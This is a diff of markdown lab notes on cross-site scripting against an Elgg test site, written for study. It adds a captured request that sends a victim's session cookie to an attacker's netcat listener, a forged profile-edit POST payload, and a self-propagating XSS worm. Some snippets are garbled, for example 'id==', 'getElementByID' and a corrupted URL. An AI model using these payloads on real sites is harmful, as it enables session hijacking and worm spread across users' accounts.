@@ -38,10 +38,21 @@ toc: true
 
 ## stealing cookie
 
-- the browser tries to load the image from the
-URL in the `src` field
+- the browser tries to load the image from the URL in the `src` field
 - an `HTTP GET request` sent to the attacker’s machine.
-- in the mean time, it sends the cookies to the `port 5555` of the attacker’s machine
+    - in the mean time, it sends the cookies to the `port 5555` of the attacker’s machine
+
+```
+// The cookie starts after %3D.
+
+GET /?c=Elgg%3Dtlgbp3diifsf0007299puq2kr1 HTTP/1.1
+Host: 192.168.56.4:1234
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+```
+
 - the attacker has a TCP server listening to the same port.
     - `$ nc -l 5555 -v`
 - The server can print out whatever it receives.
@@ -163,6 +174,7 @@ window.onload = function () {
     var Ajax=null;
     // create and send Ajax request to add friend
     Ajax = new XMLHttpRequest();
+
     Ajax.open("GET", sendurl, true);
     Ajax.setRequestHeader("Host", "www.web.com");
     Ajax.setRequestHeader("Keep-Alive", "300");
@@ -212,40 +224,89 @@ window.onload = function(){
 }
 ```
 
+---
+
+### Writing an XSS worm
+- coding a worm which can change the information of an account in the web app.
+- This requires the analysis of changing the 'about me' section in the web app.
+- The attacker user11 uses the other account samy to update the 'about me' section to study the process.
+- The 'inspect element' reveals that the process is a `POST` request which requires few parameters from the document.
+  - These parameters are specific to the session and the user,
+  - therefore, searching the parameters in the document
+
+The javascript code must contain
+- the `post request` required to proceed
+- with the changing of the text in the 'about me' section.
+
+```js
+<script type="text/javascript">
+var sendurl="http://www.xsslabelgg.com/action/profile/edit";
+var ts=elgg.security.token__elgg_ts;
+var token=elgg.security.token.__elgg_token;
+
+ff=new XMLHttpRequest();
+
+ff.open("POST",sendurl,true);
+ff.setRequestHeader("Host","www.xsslabelgg.com");
+ff.setRequestHeader("Keep-Alive","300");
+ff.setRequestHeader("Connection","keep-alive");
+ff.setRequestHeader("Cookie",document.cookie);
+ff.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+
+// http://www.xsslabelgg.com/profile/user14/edit
+ff.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/"+elgg.session.user["username"]+"/edit");
+
+// __elgg_ts=AAAA&__elgg_token=BBBB&description=User-11-is-great&name=user14&accesslevel[description]=2&guid=user14Id0000001
+params="__elgg_ts="+ts+"&__elgg_token="+token+"&description=User-11-is-great"+"&name="+elgg.session.user["username"]+"&accesslevel[description]=2&guid="+elgg.session.user["guid"];
+
+ff.send(params);
+```
+
+
+---
+
 ### self-propagation
 - exponential growth
 - dynamically generate code
 
 
-ID/DOM Approach:
+1. **ID/DOM Approach**:
 - If the entire JavaScript program (worm) is embedded in the infected profile
 - the worm code can use `DOM APIs` to retrieve a copy of itself from the web page.
 - This code gets a copy of itself, and display it in an alert window:
+
+
 ```js
-<script id=="worm" type="text/javascript">
+// if f the entire JavaScript program (i.e., the worm) is embedded in the infected profile
+// to propagate the worm to another profile
+// the worm code can use DOM APIs to retrieve a copy of itself from the web page.
+<script id="worm" type="text/javascript">
+    var badCode = document.getElementById("worm");
+    alert(badCode.innerHTML);
+</script>
 
-    // innerHTML (line ➁) only gives us the inside part of the code,
-    var copy = document.getElementById("worm").innerHTML;
-
-    header = "<script id==\"worm\" type=\"text/javascript\">";
+<script id="worm" type="text/javascript">
+    // innerHTML only gives us the inside part of the code, var copy = document.getElementById("worm").innerHTML;
+    header = "<script id=\"worm\" type=\"text/javascript\">";
     tail = "</" + "script>";
-    var wormCode = encodeURIComponent(header_copy+tail);
+    var wormCode = encodeURIComponent(header+copy+tail);
     alert(jsCode);
 </script>
 ```
 
-Src/Link Approach:
+2. **Src/Link Approach**:
 - If the worm is included using the `src` attribute in the `<script>` tag
 - can simply copy the `<script>` tag to the victim’s profile, essentially infecting the profile with the same worm.
+
 ```js
 <script type="text/javascript" src="http网站//example.com/xss_worm.js">
 </script>
 ```
 
-
+1. example
 
 ```js
-<script id=="worm" type="text/javascript">
+<script id="worm" type="text/javascript">
 
 // construct a copy of itself
 var selfProp = "<script id==\"worm\" type=\"text/javascript\">"
@@ -255,18 +316,35 @@ var selfProp = "<script id==\"worm\" type=\"text/javascript\">"
 // main code ...
 
 </script>
+
+
+
+<script id="daut" type="text/javascript">
+var sp="<script id=\"daut\" type=\"text/javascript\">".concat(document.getElementByID("daut").innerHTML).concat("</").concat("script>");
+
+var sendurl="http://www.xsslabelgg.com/action/profile/edit";
+var ts=elgg.security.token__elgg_ts;
+var token=elgg.security.token.__elgg_token;
+
+ff=new XMLHttpRequest();
+ff.open("POST",sendurl,true);
+ff.setRequestHeader("Host","www.xsslabelgg.com");
+ff.setRequestHeader("Keep-Alive","300");
+ff.setRequestHeader("Connection","keep-alive");
+ff.setRequestHeader("Cookie",document.cookie);
+ff.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+
+ff.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/".concat(elgg.session.user["username"]).concat("/edit"));
+
+params="__elgg_ts=".concat(ts).concat("&__elgg_token=").concat(token).concat("&description=User-11-is-great")
+.concat(escape(sp)).concat("&name=").concat(elgg.session.user["username"]).concat("&accesslevel[description]=2&guid=")
+.concat(elgg.session.user["guid"]);
+
+ff.send(params);
+
+
 ```
 
-self-propagation for alert
-
-```js
-<script id=="worm" type="text/javascript">
-var copy = document.getElementById("worm").innerHTML;
-header = "<script id==\"worm\" type=\"text/javascript\">";
-tail = "</" + "script>";
-alert(header_copy+tail);
-</script>
-```
 
 ---
 
